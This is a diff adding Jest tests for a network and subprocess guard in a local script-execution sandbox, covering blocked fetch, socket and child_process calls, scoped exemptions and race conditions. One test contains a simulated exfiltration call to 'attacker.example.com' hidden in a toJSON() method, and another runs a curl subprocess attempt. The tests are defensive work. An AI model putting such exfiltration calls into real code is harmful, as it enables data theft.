@@ -12,6 +12,7 @@ import { LOCAL_EXECUTION_LOAD_SUFFIX } from '../constants';
 
 import type { ExecuteAction, LoadModule } from './local-execution';
 import { executeScriptLocally } from './local-execution';
+import { forceReset } from './network-guard';
 
 const func: BackendFunction = {
     relativePath: 'src/example',
@@ -57,6 +58,11 @@ beforeEach(() => {
 type ActionsProxy = { [key: string]: ActionsProxy } & ((...args: unknown[]) => Promise<unknown>);
 
 const stubExecuteAction: ExecuteAction = async (fqn) => ({ data: null, stub: true, fqn });
+
+// Hard backstop: net/fetch/child_process are process-wide singletons, so a test that leaves them patched (e.g. an abandoned hung-function test) would otherwise leak into every later test in this Jest worker.
+afterEach(() => {
+    forceReset();
+});
 
 /** A `loadModule` double that resolves the customer's function from a map and rejects anything else with a module-not-found error, matching the common case where neither optional package is installed. */
 function loadModuleReturning(exports: Record<string, unknown>): LoadModule {
@@ -610,6 +616,29 @@ describe('local-execution — executeScriptLocally', () => {
                 50,
             ),
         ).rejects.toThrow(/timed out after 50ms/);
+    });
+
+    test('Should restore real network/subprocess access after a timeout, even though the hung function itself is still abandoned in the background', async () => {
+        const realFetch = globalThis.fetch;
+        // eslint-disable-next-line @typescript-eslint/no-require-imports
+        const realSpawn = require('child_process').spawn;
+
+        await expect(
+            executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModuleReturning({ example: () => new Promise(() => {}) }),
+                mockLogger,
+                50,
+            ),
+        ).rejects.toThrow(/timed out after 50ms/);
+
+        // The abandoned hung function is still "running" in the background, so a hard reset independent of its own try/finally is what unblocks network access for every execution after this one.
+        expect(globalThis.fetch).toBe(realFetch);
+        // eslint-disable-next-line @typescript-eslint/no-require-imports
+        expect(require('child_process').spawn).toBe(realSpawn);
     });
 
     // Asserts $'s exact key set, since a token added inside globalThis.$ wouldn't be caught by the weaker top-level check below.
@@ -1449,6 +1478,244 @@ describe('local-execution — executeScriptLocally', () => {
         });
     });
 
+    describe('network/subprocess guard', () => {
+        test('Should reject when the customer function tries a raw net.Socket connection', async () => {
+            await expect(
+                executeScriptLocally(
+                    func,
+                    TEST_PROJECT_ROOT,
+                    [],
+                    stubExecuteAction,
+                    loadModuleReturning({
+                        example: () => {
+                            // eslint-disable-next-line @typescript-eslint/no-require-imports
+                            const net = require('net');
+                            return new net.Socket().connect(80, 'example.com');
+                        },
+                    }),
+                    mockLogger,
+                ),
+            ).rejects.toThrow(/Network access is not allowed/);
+        });
+
+        test('Should reject when the customer function tries a raw fetch() call', async () => {
+            await expect(
+                executeScriptLocally(
+                    func,
+                    TEST_PROJECT_ROOT,
+                    [],
+                    stubExecuteAction,
+                    loadModuleReturning({ example: () => fetch('https://example.com') }),
+                    mockLogger,
+                ),
+            ).rejects.toThrow(/Network access is not allowed/);
+        });
+
+        test('Should reject when the customer function tries to spawn a subprocess', async () => {
+            await expect(
+                executeScriptLocally(
+                    func,
+                    TEST_PROJECT_ROOT,
+                    [],
+                    stubExecuteAction,
+                    loadModuleReturning({
+                        example: () => {
+                            // eslint-disable-next-line @typescript-eslint/no-require-imports
+                            const child_process = require('child_process');
+                            return child_process.execSync('curl https://example.com');
+                        },
+                    }),
+                    mockLogger,
+                ),
+            ).rejects.toThrow(/Spawning a subprocess is not allowed/);
+        });
+
+        test('Should still let a real $.Actions call through while the rest of the function is network-blocked', async () => {
+            const executeAction = jest.fn().mockResolvedValue({ ok: true });
+            const result = await executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                executeAction,
+                loadModuleReturning({
+                    example: async () => {
+                        const actionResult = await (
+                            globalThis as Record<string, any>
+                        ).$.Actions.slack.chat.postMessage({ inputs: { text: 'hi' } });
+                        // A raw fetch right after the sanctioned $.Actions call must still be blocked — the exemption is scoped to that one call, not the rest of the function.
+                        await expect(fetch('https://example.com')).rejects.toThrow(
+                            /Network access is not allowed/,
+                        );
+                        return actionResult;
+                    },
+                }),
+                mockLogger,
+            );
+            expect(result).toEqual({ data: { ok: true } });
+            expect(executeAction).toHaveBeenCalledWith(
+                'com.datadoghq.slack.chat.postMessage',
+                { text: 'hi' },
+                undefined,
+            );
+        });
+
+        test('Should block a malicious toJSON() on $.Actions inputs from making a real network call under cover of the exemption', async () => {
+            // toJSON() must be synchronous, so its fetch attempt can't be awaited there — capture the outcome and assert once the whole execution settles.
+            let fetchAttempt: Promise<unknown> | undefined;
+            const maliciousInputs = {
+                text: 'hi',
+                toJSON() {
+                    // Would resolve instead of rejecting if this ran inside runAllowed's window, meant only for the trusted preview-async call itself.
+                    fetchAttempt = fetch('https://attacker.example.com/exfiltrate');
+                    return { text: 'hi' };
+                },
+            };
+
+            const result = await executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModuleReturning({
+                    example: () =>
+                        (globalThis as Record<string, any>).$.Actions.slack.chat.postMessage({
+                            inputs: maliciousInputs,
+                        }),
+                }),
+                mockLogger,
+            );
+
+            expect(result).toEqual({ data: { data: null, stub: true, fqn: expect.any(String) } });
+            expect(fetchAttempt).toBeDefined();
+            await expect(fetchAttempt).rejects.toThrow(/Network access is not allowed/);
+        });
+
+        test('Should restore real network access after execution, for whatever the dev server itself does next', async () => {
+            const realFetch = globalThis.fetch;
+            await executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModuleReturning({ example: () => 'fine' }),
+                mockLogger,
+            );
+            expect(globalThis.fetch).toBe(realFetch);
+        });
+
+        test('Should keep network access allowed through two real, overlapping $.Actions calls made concurrently via Promise.all, without either blocking the other mid-flight', async () => {
+            // Proves the exemption holds through the real customer path (executeScriptLocally's Promise.all → makeActionsProxy → runAllowed), not just at the runAllowed unit level.
+            const order: string[] = [];
+            const executeAction: ExecuteAction = async (fqn) => {
+                const label = fqn.includes('slow') ? 'slow' : 'fast';
+                order.push(`${label}-start`);
+                if (label === 'slow') {
+                    await new Promise((r) => setTimeout(r, 20));
+                }
+                await fetch(`https://example.com/${label}`);
+                order.push(`${label}-end`);
+                return { ok: true, fqn };
+            };
+
+            const originalFetch = globalThis.fetch;
+            const fetchMock = jest.fn().mockResolvedValue('ok');
+            (globalThis as { fetch: typeof fetch }).fetch = fetchMock as unknown as typeof fetch;
+
+            let result: { data: unknown };
+            try {
+                result = await executeScriptLocally(
+                    func,
+                    TEST_PROJECT_ROOT,
+                    [],
+                    executeAction,
+                    loadModuleReturning({
+                        example: () => {
+                            const $ = (globalThis as Record<string, any>).$;
+                            return Promise.all([
+                                $.Actions.slow.action({ inputs: {} }),
+                                $.Actions.fast.action({ inputs: {} }),
+                            ]);
+                        },
+                    }),
+                    mockLogger,
+                );
+            } finally {
+                (globalThis as { fetch: typeof fetch }).fetch = originalFetch;
+            }
+
+            expect(result.data).toEqual([
+                { ok: true, fqn: 'com.datadoghq.slow.action' },
+                { ok: true, fqn: 'com.datadoghq.fast.action' },
+            ]);
+            // The slow call's own fetch, made after the fast call's allow scope already exited, must still resolve — proving network stayed allowed for it the entire time.
+            expect(order).toEqual(['slow-start', 'fast-start', 'fast-end', 'slow-end']);
+            expect(fetchMock).toHaveBeenCalledWith('https://example.com/slow');
+            expect(fetchMock).toHaveBeenCalledWith('https://example.com/fast');
+        });
+
+        // registerActionCatalogIfInstalled's registered callback must be exempted from the network block the same way makeActionsProxy's apply trap is, since the typed-wrapper call itself runs from inside the customer's still-blocked function.
+        test("Should let a real network call through an action-catalog typed-wrapper call, not block it as if it were the customer's own code", async () => {
+            jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
+            const executeAction: ExecuteAction = async (fqn, inputs) => {
+                const response = await fetch('https://example.com/action-catalog');
+                return { fqn, inputs, response };
+            };
+
+            let registeredImpl:
+                | ((actionId: string, request: unknown) => Promise<unknown>)
+                | undefined;
+            const loadModule: LoadModule = async (specifier: string) => {
+                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
+                    return {
+                        example: async () =>
+                            registeredImpl?.('com.datadoghq.slack.chat.postMessage', {
+                                inputs: { text: 'hi' },
+                            }),
+                    };
+                }
+                if (specifier === '@datadog/action-catalog/action-execution') {
+                    return {
+                        setExecuteActionImplementation: (
+                            impl: (actionId: string, request: unknown) => Promise<unknown>,
+                        ) => {
+                            registeredImpl = impl;
+                        },
+                    };
+                }
+                const notFoundError: NodeJS.ErrnoException = new Error(
+                    `Cannot find module '${specifier}'`,
+                );
+                notFoundError.code = 'MODULE_NOT_FOUND';
+                throw notFoundError;
+            };
+
+            const originalFetch = globalThis.fetch;
+            const fetchMock = jest.fn().mockResolvedValue('ok');
+            (globalThis as { fetch: typeof fetch }).fetch = fetchMock as unknown as typeof fetch;
+
+            let result: { data: unknown };
+            try {
+                result = await executeScriptLocally(
+                    func,
+                    TEST_PROJECT_ROOT,
+                    [],
+                    executeAction,
+                    loadModule,
+                    mockLogger,
+                );
+            } finally {
+                (globalThis as { fetch: typeof fetch }).fetch = originalFetch;
+            }
+
+            expect(result.data).toEqual({
+                fqn: 'com.datadoghq.slack.chat.postMessage',
+                inputs: { text: 'hi' },
+                response: 'ok',
+            });
+            expect(fetchMock).toHaveBeenCalledWith('https://example.com/action-catalog');
+        });
+    });
+
     describe('serialization of concurrent executions', () => {
         beforeEach(() => {
             delete (globalThis as Record<string, unknown>)[ORDER_MARKER];
@@ -2073,6 +2340,55 @@ describe('local-execution — executeScriptLocally', () => {
             await new Promise((resolve) => setTimeout(resolve, 100));
 
             expect(callCount).toBe(0);
+        });
+
+        // An abandoned execution A's own loadModule can resolve late, after a newer execution B is already inside runBlocked/runWithScopedEnv — if A's continuation reached those guards too, it would corrupt B's live state.
+        test("Should never let an abandoned execution's late-resolving loadModule enter the network/env guards while a newer execution is still inside them", async () => {
+            const makeLoadModule = (mainDelayMs: number): LoadModule => {
+                return async (specifier: string) => {
+                    if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
+                        if (mainDelayMs > 0) {
+                            await new Promise((resolve) => setTimeout(resolve, mainDelayMs));
+                        }
+                        return {
+                            example: async () => {
+                                // B's own body: still running when A's slow loadModule resolves, so any state A corrupts on its way in would be visible here.
+                                await new Promise((resolve) => setTimeout(resolve, 200));
+                                return 'b-result';
+                            },
+                        };
+                    }
+                    const notFoundError: NodeJS.ErrnoException = new Error(
+                        `Cannot find module '${specifier}'`,
+                    );
+                    notFoundError.code = 'MODULE_NOT_FOUND';
+                    throw notFoundError;
+                };
+            };
+
+            // A times out at 20ms, well before its own 150ms-delayed loadModule resolves.
+            const abandoned = executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                makeLoadModule(150),
+                mockLogger,
+                20,
+            );
+            await expect(abandoned).rejects.toThrow(/timed out after 20ms/);
+
+            // B starts as soon as the queue frees, and is still running its own 200ms body when A's loadModule resolves at the ~150ms mark.
+            const second = executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                makeLoadModule(0),
+                mockLogger,
+            );
+
+            await expect(second).resolves.toEqual({ data: 'b-result' });
         });
     });
 });
